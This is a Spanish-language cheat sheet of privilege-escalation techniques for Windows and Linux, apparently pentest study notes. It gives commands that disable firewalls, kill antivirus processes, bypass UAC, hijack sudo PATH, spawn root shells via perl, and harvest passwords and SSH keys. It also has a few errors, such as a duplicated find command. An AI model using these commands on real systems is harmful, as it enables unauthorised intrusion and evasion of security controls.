# PRIVILEGE ESCALATION:
Es el arte de realizar escalaciones tanto verticales u horizontales, ya habiendo teniendo acceso a un usuario.

- Horizontal:
  - Pasar a otro usuario con un perfil y/o permisos similares, util para obtener más datos, o vulnerabilidades puntuales como un modulo extra.
- Vertical:
  - Pasar a otro usuario con un perfil de administrador o con permisores especiales.

Tambien esta etapa varia mucho dependiendo del sistema victima ya sea mac, linux o windows, incluso cuando hablas de escalaciones dentro de un servicio dependera del tipo de lenguaje de la aplicación, sí es web, en lo general existen dos tipos:

- Vulnerabilidad:
  - Busqueda y explotación de vulnerabildades por la versión y nivel de actualización de un software instalado o del propio sistema.
- Mala configuración o practica:
  - Busqueda de malas configuraciones del sistema o servicios, como buscar credenciales guardadas en texto plano, un servicio con dlls inyectables, etc.

Ambos podemos buscarlo por un ejecutable automatizado o realizarlo manual, claro que siempre loa automatizado llamara mucho más la atención de los controles.
  
## Windows:
Aquí es más dificil que en Windows por el tema de que los EDR estan más avanzados aquí, solo como consejo siempre ejecutarlo en lotes por ejemplo los ps1 especificamente ejecutar los modulos que necesites.

### Discovery:
En las primeras etapas siempre que ya tengamos acceso inicial debemos hacer un reconocimiento por lo que siempre es bueno hacerlo más bajo perfil posible con comandos nativos de sistema:

#### CMD Commands:

- File System:
  
| Command                 | Description                                          |
|-------------------------|------------------------------------------------------|
| cmd> dir /a:h           | Retrieves the directory names with hidden attributes |
| cmd> dfindstr /E ".txt" | Retrieves all the text files                         |
| cmd> dfindstr /E ".log" | Retrieves all the log files                          |

- Hash Computing Commands:
  
| Command     | Description |
|-------------|-------------|
| powershell> Get-FileHash <file-name> -a md5 | Generates MD5 hashes |

- Registry Commands:
  
| Command     | Description |
|-------------|-------------|
| cmd> reg query HKLM /f credential /t REG_SZ /s | Extract reg using key words |
| cmd> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Installs a package with elevated privileges |
| cmd> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall | Provides a list of programs installed |

- Task List / Services:
  
| Command     | Description |
|-------------|-------------|
| schtasks /query /fo LIST | Retrieves the scheduled task list |
| tasklist /SVC | List of services in execution |

- Net:
  
| Command     | Description |
|-------------|-------------|
| net config rdr | Shows domain connection details |
| net computer \\computername /add | Add computer to the domain |
| net view | Show users and computers in the domain |
| net view \\host  | Display name of the host computer |
| net shares | Show shared resources |

- Network:
  
| Command     | Description |
|-------------|-------------|
| route print or netstat -r command | Displays routing tables for the destination |
| arp -a | Shows the ARP table for a specific IP address |
| ipconfig /all | Displays IP configuration details |
| getmac | Show MAC ADDRESS information |

- Service Commands
  
| Command     | Description |
|-------------|-------------|
| sc queryex type=service state=all | Lists all the available services | 
| sc queryex type=service state=all | find /i "Name of the service: myService" | Lists details about the specified service |
| net start or stop | Starts/stops a network service |
| netsh firewall show state | Displays the current firewall state |
| netsh firewall show config | Displays firewall settings |
| netsh advfirewall set currentprofile state off | Turn off the firewall service for the current profile |
| netsh advfirewall set allprofiles state of | Turn off the firewall service for all profiles |

- Remote Execution Commands:
  
| Command     | Description |
|-------------|-------------|
| wmic /node:<IP-address> /user:administrator /password:$PASSWORD bios get serialnumber | Retrieves the PC’s serial number |
| taskkill.exe /S <IP address> /U domain\username /F /FI "eset" | Terminate process associated to eset |
| tasklist.exe /S <IP address> /U domain\username /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running" | Retrieves all the processes running on the system that are not actually “SYSTEM |

- Sysinternals Command
  
| Command     | Description |
|-------------|-------------|
| psexec -i \\<RemoteSystem> cmd | Establishes an interactive CMD with a remote system |
| psexec -i \\<RemoteSystem> -c file.exe | Copies file.txt from the local machine to a remote computer |
| psexec -i -d -s c:\windows\regedit.exe | Retrieves the contents of security keys and SAM |
| psexec -i \\<RemoteSystem> ipconfig /al | CMD commands |

### Automatizado:

#### BeRoot:
Software ejecutable en exe que nos entrega permisos del usuario, permisos sobre StartupKeys, servicios, etc.
https://github.com/AlessandroZ/BeRoot

#### Seatbelt:
Software ejecutable en visual studio debes compilarlo, con más opciones que el anterior.
https://github.com/GhostPack/Seatbelt

#### Meterpreter:
Esta herramienta tiene tambien un mundo de comandos para escalación de privilegios, pero sí los anteriores hacen ruido este hoy en día no va a funcionar a menos que este apagado windows defender o es un sistema antiguo como un windows server anterior al 2008.

#### getsystem:
Es el más comun mediante una serie de diferentes de tecnicas realiza la escalación de privilegios locales en un sistema.

#### Bypass UAC:
Usado cuando estamos dentro de un grupo administrativo, pero tenemos "Medium Mandatory Level" podemos subir a "High Mandatory level" para poder usar tecnicas con más privilegios como mimikatz.

Validemos los siguientes registros esten activos:
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

Compilamos el siguiente exploit, e incluso podemos hacerlo sin necesidad del exploit usando psexec:

- https://github.com/k4sth4/UAC-bypass

La alternativa es usar metasploit:
```
> msfconsole
> use exploit/windows/local/bypassuac_fodhelper
```

## Linux:
En windows es similar los conceptos generales, pero ya la forma de realizarlo cambia.

## Discovery:
Siempre es bueno revisar en lo general el estado, con el tiempo sabras identificar que malas practicas podria tener el SO más rapido.

### Reconocimiento general:
Primero siempre es bueno reconocer el panorama general:
```
ps -ef #Tabla de procesos con el respectivo ID
```
```
mount -l #Muestra los dispositivos (/dev) o archivos montados en carpetas del sistemas
```
```
route -n #Tabla de ruteo
```
```
/sbin/ifconfig -a #All ifconfig
```
```
cat /etc/crontab o ls -la /etc/cron.d o crontab -l #Mostrar los cron que esta corrriendo
```
```
cat /etc/exports #Archivos exportables a NFS
```
```
cat /etc/redhat* /etc/debian* /etc/*release #version de OS
```
```
ls /etc/rc* #Lista inicios de Bootup
```
```
egrep -e '/bin/(ba)?sh' /etc/passwd #Usuarios con shell
```
```
cat ~/.ssh/ #buscar las key de ssh
```

### Abusar de caracteristicas especiales:
Hay ciertas configuraciones en linux que pueden ser abusadas.

#### SUDO -L
Nos regresara los permisos que tenemos para correr binarios con permisos de sudo, es un resultado similar a:
```
> sudo -l
  User kali may run the following commands on kali:
    (ALL : ALL) ALL (Podemos correr cualquier comando con sudo pero nos pedira password, usualmente para usuarios de admin)
    (kali : docker) NOPASSWD: /usr/bin/kaboxer (no nos pedira password para correr este comando)
```
Cuando un binario esta asignado con sudo hay dos formas basicas de abusar de el:
  
1 - Ruta mal implementada: 
  Un binario que este sin una ruta completa puede abusarse de borrar el valor de PATH (variable usada para almacenar donde se localizan los binarios), por ejemplo:
```
> sudo -l
  User kali may run the following commands on kali:
    (kali : docker) NOPASSWD: kaboxer
> echo $PATH           
  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
> sudo kaboxer (probara con las rutas anteriores de derecha a izquiera buscando al binario)
> export PATH=/tmp:$PATH (agregaremos la carpeta tmp para que primero busque ahí a un falso binario)
> sudo kaboxer (ejecutara /tmp/kaboxer)
```
2 - Abusar de la naturaleza del binario:
   Este es el más facil de abusar, por ejemplo sí tenemos a "cat" puedes simplemente abusar para leer archivos sensibles como shadow, pero.. hay otros que permiten ejecutar una shell, para esto simplemente apoyate de este buscador:

- https://gtfobins.github.io/

Por ejemplo, sí tienes a el binario de perl simplemente ejecuta:
```
> perl -e 'exec "/bin/sh";'
> whoami
  root
```
3 - Abusar de metodo interno:
  Sí tiene una ruta completa, y es un binario o sh debemos ver internamente sus metodos para buscar sí alguno puede ser suceptible a inyectarle codigo.
```
> sudo imprimir.sh
```
Por ejemplo sí el anterior archivo tiene un metodo que manda a ejecutar un cat para leer archivos pdf recientes de un server web basado en una variable de entorno del path donde estan los pdf, puedes borrar el valor de la variable local o dejarla vacia y subir un archivo pdf con el nombre /etc/passwd, asi leeras los archivos que quieras.

Esto puede variar mucho y tendras que usar mucho tu logica.

### SUID:
Los SUID son identificadores que permiten ejecutar binarios con permisos del owner, sin necesidad de sudo o contraseña del dueño, en casos donde el owner es otro usuario o root, podriamos ejecutarlo y elevar privilegios

Buscar archivos SUID:
```
>find / -perm -3000 -ls 2> /dev/null
>/usr/bin/whoami
>ls -l /usr/bin/whoami
.rwsr-xr-x root root datetime /usr/bin/whoami
```
Por ejemplo, sí el binario whoami tiene permisos de ejecutarse con SUID (lo notaras por el s en vez de una x), al ejecutarlo veremos que el usuario es root y no el usuario con el que estamos usando la CLI.

NOTA: SUID solo funciona en binarios, no en scripts.

#### World-Writable files and directories:
Sí tenemos archivos que tengan permisos write por todo el mundo por ejemplo de otro usuario o root, podemos ver sí es un archivo que se ejecute por cron con permisos de root, o que se ejecute constamente por otro usuario, por ejemplo sí el archivo cat es escribible podemos modificarlo y esperar a que mediante otra sesión el usuario real ejecute cat y recibir una reverse shell.

Archivos:
```
> find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null
```
Directorios:
```
> find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null
```

#### Buscar archivos con contraseñas:
Basicamente buscar contraseñas en archivos legibles, como archivos de configuración o por mala practica guardar contraseñas localmente.
Hay muchas formas, necesitaras aplicar logica a la busqueda, siempre recomiendo que en base a servicios o framework busques donde se almacenan en especifico, por sino puede ser tedioso, por ejemplo WPress usualmente guarda los accesos en wp-config.php

Sino puedes hacer barrido en base al nombre del archivo:
```
> find / -name "*.txt" -ls 2> /dev/null
> find / -name "pass*.txt" -ls 2> /dev/null
```
O en base a su contenido:
```
> grep -riI 'password' /path
> grep -riI 'pass=' /path
> grep -riI 'pass:' /path
> grep -riI 'user' /path
...
```
##### Archivos keystore.jks
Archivos de almacenamiento para llaves publicas y privadas o contraseñas, por ejemplo, kafka puede usa este tipo de archivos:

```
> find / -name "pass*.txt" -ls 2> /dev/null
  3159787      4 -r--r--r--   1 kali     kali         1238 Apr 17 16:25 /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/kafka.broker1.truststore.jks
  3159786      8 -r--r--r--   1 kali     kali         4554 Apr 17 16:25 /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/kafka.broker1.keystore.jks

> ls /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets
...
broker1_keystore_creds (contraseña del jks)
...
> cat /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/broker1_keystore_creds
testing
> keytool -list -v -keystore /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/kafka.broker1.keystore.jks
  Introduce la contraseña: testing
... Contenido del jks
```

### Falta parcheo:
Los sistemas linux usualmente son los que menos se actualizan a diferencia de windows, en algunos casos la existencia de vulnerabilidades del kernel son las más delicadas.

#### PKNKIT:
Vulnerabilidad muy facil de explotar pasando de usuario sin permisos a root.
```
https://github.com/ly4k/PwnKit
```

## Servicios:
A diferencia de los puntos anteriores, aqui vas a abusar directamente de un servicio no del sistema operativo.

### NFS:

## 
































